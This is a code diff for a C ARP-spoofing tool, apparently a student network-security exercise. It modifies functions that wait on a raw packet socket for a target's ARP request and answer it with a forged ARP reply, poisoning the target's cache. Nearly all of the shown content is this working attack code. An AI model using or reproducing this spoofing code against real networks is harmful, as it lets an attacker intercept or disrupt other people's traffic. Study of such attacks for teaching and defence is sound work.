@@ -6,6 +6,7 @@
 #include <netinet/in.h>
 #include <netinet/if_ether.h>
 #include <arpa/inet.h>
+#include <linux/if_packet.h>
 #include "ft_status.h"
 #include "malcolm_validator.h"
 #include "ft_spoof.h"
@@ -81,11 +82,12 @@ int     is_arp_request_from_target(uint8_t *ip_rqst, uint8_t *mac_rqst, uint8_t 
     return 1;
 }
 
-int     send_arp_response(struct spoofaddrs addrs, struct ft_ethhdr *eth, struct ft_arphdr *arp, struct sockaddr *to, int sock)
+int     send_arp_response(struct spoofaddrs addrs, struct ft_ethhdr *eth, struct ft_arphdr *arp, struct sockaddr_ll to, int sock)
 {
     struct ft_arpbody response;
     uint8_t tmpip[IP_LEN];
-    int     reclen;
+    int     sentlen;
+    socklen_t addrlen = sizeof(struct sockaddr_ll);
 
     printf("Sending ARP response to target\n");
 
@@ -102,32 +104,33 @@ int     send_arp_response(struct spoofaddrs addrs, struct ft_ethhdr *eth, struct
     response.eth = *eth;
     response.arp = *arp;
 
-    reclen = sendto(sock, &response, sizeof(struct ft_arpbody), 0, to, sizeof(struct sockaddr));
-    if (reclen <= 0)
+    sentlen = sendto(sock, &response, sizeof(struct ft_arpbody), 0, (struct sockaddr *)&to, addrlen);
+    if (sentlen <= 0)
     {
         perror("Can't send ARP response");
         return CANT_SEND_ARP_RESPONSE;
     }
+    printf("ARP response setnt!\n");
     return SUCCESS;
 }
 
-int     spoof(struct spoofaddrs addrs, char *interface_name, int sock)
+int     spoof(struct spoofaddrs addrs, int sock)
 {
-    char                done, buf[sizeof(struct ft_ethhdr) + sizeof(struct ft_arphdr)], arp_src_ip[IP_LEN+IP_LEN], arp_src_mac[MAC_LEN+MAC_LEN];
-    size_t              reclen;
-    struct sockaddr     from;
+    char                done, buf[sizeof(struct ft_ethhdr) + sizeof(struct ft_arphdr)];
+    int                 reclen;
+    struct sockaddr_ll  from;
     socklen_t           fromlen;
     struct ft_ethhdr    *eth;
     struct ft_arphdr    *arp;
     uint16_t            ptype, opcode;
 
-    fromlen = sizeof(from);
+    fromlen = sizeof(struct sockaddr_ll);
     done = 0;
 
     printf("waiting for ARP request\n");
     while (!done)
     {
-        reclen = recvfrom(sock, buf, ETH_FRAME_LEN, 0, &from, &fromlen);
+        reclen = recvfrom(sock, buf, ETH_FRAME_LEN, 0, (struct sockaddr *)&from, &fromlen);
         if(reclen < 0)
         {
             perror("ERROR: Can't receive message\n");
@@ -146,9 +149,10 @@ int     spoof(struct spoofaddrs addrs, char *interface_name, int sock)
         if (is_arp_request_from_target(arp->spa, arp->sha, addrs.ip_target, addrs.mac_target))
         {
             printf("ARP request from target received!\n");
-            done = send_arp_response(addrs, eth, arp, &from, sock) == SUCCESS;
+            done = send_arp_response(addrs, eth, arp, from, sock) == SUCCESS;
         }
     }
+    return SUCCESS;
 }
 
 void parse_ip_v4(char *str_ip, uint8_t *dst)
@@ -178,7 +182,7 @@ void parse_mac(char *mac, uint8_t *dst)
 int     main(int argc, char** argv)
 {
     int                 validation_result, sock;
-    char                *ip_source, *ip_target, *mac_source, *mac_target, *interface_name;
+    // char                *interface_name;
     struct spoofaddrs   spaddrs;
 
     validation_result = validate_args(argc, argv);
@@ -191,7 +195,7 @@ int     main(int argc, char** argv)
     parse_mac(argv[2], spaddrs.mac_source);
     parse_mac(argv[4], spaddrs.mac_target);
     
-    interface_name = chooseInterface();
+    // interface_name = chooseInterface();
 
 
     sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));    
@@ -203,7 +207,7 @@ int     main(int argc, char** argv)
         return CANT_OPEN_SOCKET;
     }
 
-    spoof(spaddrs, interface_name, sock);
+    spoof(spaddrs, sock);
 
     return SUCCESS;
 }
